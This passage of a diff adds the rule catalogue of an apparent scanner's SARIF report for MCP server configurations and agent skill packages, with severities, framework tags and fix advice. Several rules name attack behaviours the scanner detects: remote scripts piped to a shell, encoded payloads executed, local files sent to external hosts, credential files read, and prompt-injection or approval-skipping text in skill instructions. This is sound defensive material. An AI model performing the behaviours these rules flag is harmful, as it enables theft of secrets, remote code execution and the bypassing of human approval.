+                "text": "Change the secret at its source, then replace the literal value with a reference such as ${NAME} that your client expands."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-010?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-010",
+              "name": "LiteralValueUnderASecretNameInAnMCPServerConfiguration",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "MCP01",
+                  "MCP07",
+                  "IA-5",
+                  "AML.T0083"
+                ]
+              },
+              "shortDescription": {
+                "text": "Literal value under a secret name in an MCP server configuration"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Remove the setting that approves every tool call, or limit it to tools that only read, so the client asks before the others run.\n\n[How to fix SW-CFG-012](https://spellwarden.ai/docs/rules/sw-cfg-012?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Remove the setting that approves every tool call, or limit it to tools that only read, so the client asks before the others run."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-012?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-012",
+              "name": "MCPServerConfiguredToApproveEveryToolCallAutomatically",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI02",
+                  "AC-6",
+                  "CM-7",
+                  "AML.T0053"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server configured to approve every tool call automatically"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Add the server's read-only switch, and give write access to a separate entry that stays disabled until the work needs it.\n\n[How to fix SW-CFG-013](https://spellwarden.ai/docs/rules/sw-cfg-013?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Add the server's read-only switch, and give write access to a separate entry that stays disabled until the work needs it."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-013?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-013",
+              "name": "DatabaseOrClusterMCPServerWithWriteAccessAlthoughAReadOnlyModeExists",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "MCP02",
+                  "AC-3",
+                  "AC-6",
+                  "AML.T0053"
+                ]
+              },
+              "shortDescription": {
+                "text": "Database or cluster MCP server with write access although a read-only mode exists"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Require authentication before the server answers tools/list, using OAuth with protected resource metadata.\n\n[How to fix SW-MCP-001](https://spellwarden.ai/docs/rules/sw-mcp-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Require authentication before the server answers tools/list, using OAuth with protected resource metadata."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-001",
+              "name": "ServerListsToolsWithoutAuthentication",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "MCP07",
+                  "AC-3",
+                  "AML.T0084.001",
+                  "AML.T0132"
+                ]
+              },
+              "shortDescription": {
+                "text": "Server lists tools without authentication"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Move the server from a static key to OAuth with protected resource metadata, and until then scope the key to one client and rotate it.\n\n[How to fix SW-MCP-002](https://spellwarden.ai/docs/rules/sw-mcp-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Move the server from a static key to OAuth with protected resource metadata, and until then scope the key to one client and rotate it."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-002",
+              "name": "StaticKeyAuthenticationInsteadOfOAuth",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "MCP01",
+                  "MCP07",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "Static key authentication instead of OAuth"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Turn on Client ID Metadata Documents at the authorization server and publish client\\_id\\_metadata\\_document\\_supported as true in its metadata.\n\n[How to fix SW-MCP-003](https://spellwarden.ai/docs/rules/sw-mcp-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Turn on Client ID Metadata Documents at the authorization server and publish client_id_metadata_document_supported as true in its metadata."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-003",
+              "name": "OAuthDynamicClientRegistrationDeprecatedUseClientIDMetadataDocuments",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "MCP07",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "OAuth dynamic client registration (deprecated; use Client ID Metadata Documents)"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Move the server from HTTP+SSE to the streamable HTTP transport, which answers POST requests on one address.\n\n[How to fix SW-MCP-004](https://spellwarden.ai/docs/rules/sw-mcp-004?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Move the server from HTTP+SSE to the streamable HTTP transport, which answers POST requests on one address."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-004?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-004",
+              "name": "HTTPSSETransportDeprecated",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "HTTP+SSE transport (deprecated)"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "help": {
+                "markdown": "Update the MCP server library to a release that supports protocol version 2026-07-28, and list that version in supportedVersions.\n\n[How to fix SW-MCP-005](https://spellwarden.ai/docs/rules/sw-mcp-005?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Update the MCP server library to a release that supports protocol version 2026-07-28, and list that version in supportedVersions."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-005?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-005",
+              "name": "SpecVersionOlderThan20260728",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "Spec version older than 2026-07-28"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Make the server stateless: stop issuing Mcp-Session-Id and keep what the session held in each request or in your own storage.\n\n[How to fix SW-MCP-006](https://spellwarden.ai/docs/rules/sw-mcp-006?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Make the server stateless: stop issuing Mcp-Session-Id and keep what the session held in each request or in your own storage."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-006?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-006",
+              "name": "ProtocolSessionsMcpSessionIdInUse",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "Protocol sessions (Mcp-Session-Id) in use"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Add a server/discover handler that returns the supported versions, the capabilities and the server information.\n\n[How to fix SW-MCP-007](https://spellwarden.ai/docs/rules/sw-mcp-007?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Add a server/discover handler that returns the supported versions, the capabilities and the server information."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-007?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-007",
+              "name": "RequiresTheInitializeHandshakeNoServerDiscover",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "Requires the initialize handshake; no server/discover"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Replace Roots, Sampling and Logging as the migration checklist describes, then remove them from the capabilities the server declares.\n\n[How to fix SW-MCP-008](https://spellwarden.ai/docs/rules/sw-mcp-008?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Replace Roots, Sampling and Logging as the migration checklist describes, then remove them from the capabilities the server declares."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-008?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-008",
+              "name": "UsesDeprecatedRootsSamplingOrLogging",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3"
+                ]
+              },
+              "shortDescription": {
+                "text": "Uses deprecated Roots, Sampling or Logging"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Serve the endpoint over https, with a proxy you operate in front of the server if it cannot terminate TLS itself.\n\n[How to fix SW-MCP-009](https://spellwarden.ai/docs/rules/sw-mcp-009?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Serve the endpoint over https, with a proxy you operate in front of the server if it cannot terminate TLS itself."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-009?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-009",
+              "name": "EndpointNotServedOverHTTPS",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "SC-7"
+                ]
+              },
+              "shortDescription": {
+                "text": "Endpoint not served over HTTPS"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Publish protected resource metadata at the address the 401 answer names, list your authorization server in it, and make that server's issuer match its address.\n\n[How to fix SW-MCP-010](https://spellwarden.ai/docs/rules/sw-mcp-010?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Publish protected resource metadata at the address the 401 answer names, list your authorization server in it, and make that server's issuer match its address."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-010?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-010",
+              "name": "NoProtectedResourceMetadataOrIssuerNotValidated",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "MCP07",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "No protected resource metadata, or issuer not validated"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Rewrite the description so it says only what the tool does and what its arguments mean, or stop using the server if you do not run it.\n\n[How to fix SW-MCP-011](https://spellwarden.ai/docs/rules/sw-mcp-011?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Rewrite the description so it says only what the tool does and what its arguments mean, or stop using the server if you do not run it."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-011?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-011",
+              "name": "MCPServerTextContainsInstructionLikeText",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "MCP03",
+                  "SI-10",
+                  "AML.T0110.000",
+                  "AML.T0051.001"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server text contains instruction-like text"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Read each changed tool, then approve the new tool list if you expected the change, or remove the server from your agents if you did not.\n\n[How to fix SW-MCP-012](https://spellwarden.ai/docs/rules/sw-mcp-012?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Read each changed tool, then approve the new tool list if you expected the change, or remove the server from your agents if you did not."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-mcp-012?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-MCP-012",
+              "name": "MCPServerSToolsChangedSinceTheyWereApproved",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "MCP03",
+                  "SI-7",
+                  "AML.T0109",
+                  "AML.T0110.000"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server's tools changed since they were approved"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Request the skill's admission to your organisation's private registry with the link in the report, or take the skill out of the change.\n\n[How to fix SW-REG-001](https://spellwarden.ai/docs/rules/sw-reg-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Request the skill's admission to your organisation's private registry with the link in the report, or take the skill out of the change."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-reg-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-REG-001",
+              "name": "SkillPackageNotAdmittedInTheOrganisationSPrivateRegistry",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST09"
+                ]
+              },
+              "shortDescription": {
+                "text": "Skill package not admitted in the organisation's private registry"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Request the MCP server's admission to your organisation's private registry with the link in the report, or take the server out of the change.\n\n[How to fix SW-REG-002](https://spellwarden.ai/docs/rules/sw-reg-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Request the MCP server's admission to your organisation's private registry with the link in the report, or take the server out of the change."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-reg-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-REG-002",
+              "name": "MCPServerNotAdmittedInTheOrganisationSPrivateRegistry",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "MCP09",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST09"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server not admitted in the organisation's private registry"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Make the item identifiable, for example by pinning every package to an exact version and writing the launch out in full, then request its admission.\n\n[How to fix SW-REG-003](https://spellwarden.ai/docs/rules/sw-reg-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Make the item identifiable, for example by pinning every package to an exact version and writing the launch out in full, then request its admission."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-reg-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-REG-003",
+              "name": "AgentContentThePrivateRegistryCannotJudge",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST09"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent content the private registry cannot judge"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Delete the sentence that tells the model to ignore its instructions or keep things from the user, and describe the task in plain steps instead.\n\n[How to fix SW-SKL-001](https://spellwarden.ai/docs/rules/sw-skl-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Delete the sentence that tells the model to ignore its instructions or keep things from the user, and describe the task in plain steps instead."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-001",
+              "name": "PromptInjectionPhrasesInSkillInstructions",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "SI-10",
+                  "AML.T0051.001",
+                  "AML.T0110.000",
+                  "AST05"
+                ]
+              },
+              "shortDescription": {
+                "text": "Prompt-injection phrases in skill instructions"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Delete the hidden characters the finding names, for example by retyping the line in an editor that shows invisible characters, and check the lines around it.\n\n[How to fix SW-SKL-002](https://spellwarden.ai/docs/rules/sw-skl-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Delete the hidden characters the finding names, for example by retyping the line in an editor that shows invisible characters, and check the lines around it."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-002",
+              "name": "HiddenTextZeroWidthOrBidirectionalControlCharacters",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "SI-10",
+                  "AML.T0068",
+                  "AML.T0110.000",
+                  "AST05"
+                ]
+              },
+              "shortDescription": {
+                "text": "Hidden text: zero-width or bidirectional control characters"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Remove the instruction to skip approvals or disable hooks, and approve the commands a step needs once, in the agent's own permission settings.\n\n[How to fix SW-SKL-003](https://spellwarden.ai/docs/rules/sw-skl-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Remove the instruction to skip approvals or disable hooks, and approve the commands a step needs once, in the agent's own permission settings."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-003",
+              "name": "InstructionsToSkipApprovalsOrDisableHooks",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "AC-6",
+                  "AML.T0081",
+                  "AST03"
+                ]
+              },
+              "shortDescription": {
+                "text": "Instructions to skip approvals or disable hooks"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Write the command out in plain text where a reviewer can read it, and remove the step that decodes and runs it.\n\n[How to fix SW-SKL-004](https://spellwarden.ai/docs/rules/sw-skl-004?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Write the command out in plain text where a reviewer can read it, and remove the step that decodes and runs it."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-004?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-004",
+              "name": "EncodedPayloadDecodedAndExecuted",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0011.002",
+                  "AST01"
+                ]
+              },
+              "shortDescription": {
+                "text": "Encoded payload decoded and executed"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Take the change to the agent's configuration out of the skill and describe the setting instead, so the project's owner makes it by hand in a reviewed change.\n\n[How to fix SW-SKL-005](https://spellwarden.ai/docs/rules/sw-skl-005?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Take the change to the agent's configuration out of the skill and describe the setting instead, so the project's owner makes it by hand in a reviewed change."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-005?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-005",
+              "name": "WritesToAgentConfiguration",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "AC-6",
+                  "AML.T0081",
+                  "AST03"
+                ]
+              },
+              "shortDescription": {
+                "text": "Writes to agent configuration"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Add a step that shows what the command will remove and asks the user to confirm before it runs, and limit it to a path the script created.\n\n[How to fix SW-SKL-006](https://spellwarden.ai/docs/rules/sw-skl-006?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Add a step that shows what the command will remove and asks the user to confirm before it runs, and limit it to a path the script created."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-006?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-006",
+              "name": "DestructiveCommandWithoutAConfirmationStep",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "AC-6",
+                  "AML.T0101"
+                ]
+              },
+              "shortDescription": {
+                "text": "Destructive command without a confirmation step"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Download the script to a file and check it against a published checksum before you run it, or install the tool from a package manager at a pinned version.\n\n[How to fix SW-SKL-007](https://spellwarden.ai/docs/rules/sw-skl-007?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Download the script to a file and check it against a published checksum before you run it, or install the tool from a package manager at a pinned version."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-007?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-007",
+              "name": "RemoteScriptPipedToAShell",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "MCP04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST02"
+                ]
+              },
+              "shortDescription": {
+                "text": "Remote script piped to a shell"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Remove the command that sends local files, and send only data the skill produced itself, to a host its description names.\n\n[How to fix SW-SKL-008](https://spellwarden.ai/docs/rules/sw-skl-008?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Remove the command that sends local files, and send only data the skill produced itself, to a host its description names."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-008?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-008",
+              "name": "SendsLocalFileContentsToAnExternalHost",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "SC-7",
+                  "AML.T0086",
+                  "AML.T0037",
+                  "AST01"
+                ]
+              },
+              "shortDescription": {
+                "text": "Sends local file contents to an external host"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Pin each install to an exact version, for example package==1.4.2 for pip, and add a lock file or hashes where the tool supports them.\n\n[How to fix SW-SKL-009](https://spellwarden.ai/docs/rules/sw-skl-009?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Pin each install to an exact version, for example package==1.4.2 for pip, and add a lock file or hashes where the tool supports them."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-009?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-009",
+              "name": "UnpinnedDependencyInstall",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "MCP04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST02",
+                  "AST07"
+                ]
+              },
+              "shortDescription": {
+                "text": "Unpinned dependency install"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Replace the bundled binary with source code or a pinned install from a package manager, or publish its source and checksum next to it.\n\n[How to fix SW-SKL-010](https://spellwarden.ai/docs/rules/sw-skl-010?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Replace the bundled binary with source code or a pinned install from a package manager, or publish its source and checksum next to it."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-010?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-010",
+              "name": "BundledBinaryOrExecutableFile",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0011.001",
+                  "AST02"
+                ]
+              },
+              "shortDescription": {
+                "text": "Bundled binary or executable file"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Revoke the credential at its provider, remove it from the package and have the skill read it from an environment variable or the user's secret store.\n\n[How to fix SW-SKL-011](https://spellwarden.ai/docs/rules/sw-skl-011?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Revoke the credential at its provider, remove it from the package and have the skill read it from an environment variable or the user's secret store."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-011?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-011",
+              "name": "HardCodedCredentialInThePackage",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "MCP01",
+                  "IA-5",
+                  "AML.T0055"
+                ]
+              },
+              "shortDescription": {
+                "text": "Hard-coded credential in the package"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Stop reading the credential file, or say in the line above the read why the skill needs it, so a reviewer can judge it.\n\n[How to fix SW-SKL-012](https://spellwarden.ai/docs/rules/sw-skl-012?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Stop reading the credential file, or say in the line above the read why the skill needs it, so a reviewer can judge it."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-012?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-012",
+              "name": "ReadsACredentialFilePathWithoutStatingPurpose",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "IA-5",
+                  "AML.T0098"
+                ]
+              },
+              "shortDescription": {
+                "text": "Reads a credential file path without stating purpose"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Call the service by its real host name over https instead of a raw IP address, and replace a shortened link with the address it points to.\n\n[How to fix SW-SKL-013](https://spellwarden.ai/docs/rules/sw-skl-013?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Call the service by its real host name over https instead of a raw IP address, and replace a shortened link with the address it points to."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-013?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-013",
+              "name": "NetworkCallsToRawIPAddressesOrURLShorteners",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "SC-7",
+                  "AML.T0025"
+                ]
+              },
+              "shortDescription": {
+                "text": "Network calls to raw IP addresses or URL shorteners"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Replace the obfuscated or evaluated code with plain code that does the one thing the script needs, and move large data blocks into a data file.\n\n[How to fix SW-SKL-014](https://spellwarden.ai/docs/rules/sw-skl-014?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Replace the obfuscated or evaluated code with plain code that does the one thing the script needs, and move large data blocks into a data file."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-014?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-014",
+              "name": "ObfuscatedScriptCode",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0011.001"
+                ]
+              },
+              "shortDescription": {
+                "text": "Obfuscated script code"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "help": {
+                "markdown": "Start SKILL.md with a front matter block that holds a name in lower case letters, digits and hyphens and a one-sentence description.\n\n[How to fix SW-SKL-015](https://spellwarden.ai/docs/rules/sw-skl-015?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Start SKILL.md with a front matter block that holds a name in lower case letters, digits and hyphens and a one-sentence description."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-015?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-015",
+              "name": "FrontmatterMissingOrInvalidNameDescription",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AST04"
+                ]
+              },
+              "shortDescription": {
+                "text": "Frontmatter missing or invalid (name, description)"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "List the hosts the skill may read from, and treat what a fetched page says as data to summarise, never as instructions.\n\n[How to fix SW-SKL-019](https://spellwarden.ai/docs/rules/sw-skl-019?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "List the hosts the skill may read from, and treat what a fetched page says as data to summarise, never as instructions."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-skl-019?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-SKL-019",
+              "name": "FetchesExternalURLContentIntoContextWithoutAnAllowlist",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "MCP06",
+                  "SI-10",
+                  "AML.T0051.001",
+                  "AST05"
+                ]
+              },
